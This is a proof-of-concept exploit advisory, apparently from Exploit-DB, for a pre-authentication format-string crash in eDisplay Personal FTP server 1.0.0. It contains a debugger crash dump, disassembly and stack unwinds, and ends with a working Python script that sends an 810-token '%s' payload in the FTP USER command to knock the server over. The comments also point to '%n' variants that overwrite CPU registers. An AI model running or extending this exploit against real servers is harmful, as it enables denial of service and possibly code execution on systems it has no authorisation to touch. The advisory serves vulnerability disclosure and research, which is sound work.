
# Title: eDisplay Personal FTP server 1.0.0 Pre-Authentication DoS (PoC)
# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
# Found by: loneferret
# Hat's off to dookie2000ca
# Disvovery date: 16/03/2010
# Software link: http://edisplay-personal-ftp-server.software.informer.com/
# Tested on: Windows XP SP3 Professional
# Nod to the Exploit-DB Team
 
# Vendor informed via email : 17/03/2010
 
#!/usr/bin/python
 
#Pre-Authentication crash #1
#I say crash number 1 since there's another instance where it crashes with the USER command.
#Also many post-authentication commands also crash with the same buffer type (%n for example)
#with variant degrees of interesting CPU registry overwrites.
#It will crash if you send it about 40 '%s' really, but I've included my full session of 810 bytes sent.
#As always, if anyone wants to take this further go right ahead. Just be nice and don't forget who found it.
 
#CONTEXT DUMP
# EIP: 7e4287aa mov dl,[eax]
# EAX: 73736150 (1936941392) -> N/A
# EBX: 0000000a ( 10) -> N/A
# ECX: 73736150 (1936941392) -> N/A
# EDX: 00000000 ( 0) -> N/A
# EDI: 0012c9a6 ( 1231270) -> P(9d%s%s%s%s%s%s%s%s%s%s...%s%s%s%s%s%s%s%s%s%:UBsSHs%:vHEs<;T (stack)
# ESI: 73736151 (1936941393) -> N/A
# EBP: 0012c8e4 ( 1231076) -> P 9Hw331 Password required for Pthis control can act as an OLE drag/drop source,
#    and whether this process is started automatically
#    or under programmatic control.P(9d%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s (stack)
# ESP: 0012c89c ( 1231004) -> 9HwC(J :^:{P 9Hw331 Password required for Pthis control can act as an OLE drag/drop source, and whether this process is started automatically or under programmatic (stack)
# +00: 0139b8d0 ( 20560080) -> PWSOCK32.DLL (heap)
# +04: 77124880 (1997686912) -> N/A
# +08: 000000cd ( 205) -> N/A
# +0c: 00000000 ( 0) -> N/A
# +10: ffffffff (4294967295) -> N/A
# +14: 00000000 ( 0) -> N/A
 
#disasm around:
#   0x7e428794 push eax
#   0x7e428795 push byte 0x0
#   0x7e428797 push esi
#   0x7e428798 lea eax,[ebp+0x8]
#   0x7e42879b push eax
#   0x7e42879c call [0x7e4114b8]
#   0x7e4287a2 jmp 0x7e428747
#   0x7e4287a4 test eax,eax
#   0x7e4287a6 jz 0x7e42875e
#   0x7e4287a8 jmp 0x7e428747
#   0x7e4287aa mov dl,[eax]
#   0x7e4287ac inc eax
#   0x7e4287ad test dl,dl
#   0x7e4287af jnz 0x7e4287aa
#   0x7e4287b1 sub eax,esi
#   0x7e4287b3 xor esi,esi
#   0x7e4287b5 xor edx,edx
#   0x7e4287b7 cmp [ebp-0x28],edx
#   0x7e4287ba jnl 0x7e443411
#   0x7e4287c0 sub [ebp-0x18],eax
#   0x7e4287c3 cmp esi,edx
 
#stack unwind:
#   FtpServX.dll:50e0989b
#   FtpServX.dll:50e0a6d8
#   FtpServX.dll:50e09d91
#   USER32.dll:7e418734
#   USER32.dll:7e418816
#   USER32.dll:7e4189cd
#   USER32.dll:7e4196c7
#   MSVBVM60.DLL:7342a6b0
#   MSVBVM60.DLL:7342a627
#   MSVBVM60.DLL:7342a505
 
#SEH unwind:
#   0012fdf8 -> FtpServX.dll:50e1ceb4 mov eax,0x50e1fcf8
#   0012fe58 -> USER32.dll:7e44048f push ebp
#   0012ffa8 -> USER32.dll:7e44048f push ebp
#   0012ffe0 -> MSVBVM60.DLL:7350bafd push ebp
#   ffffffff -> kernel32.dll:7c839ac0 push ebp
 
 
import socket
 
buffer = ("%s") * 810   # \x25\x73
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('xxx.xxx.xxx.xxx',21))
s.recv(1024)
s.send('USER '+buffer+'\r\n')
s.recv(1024)

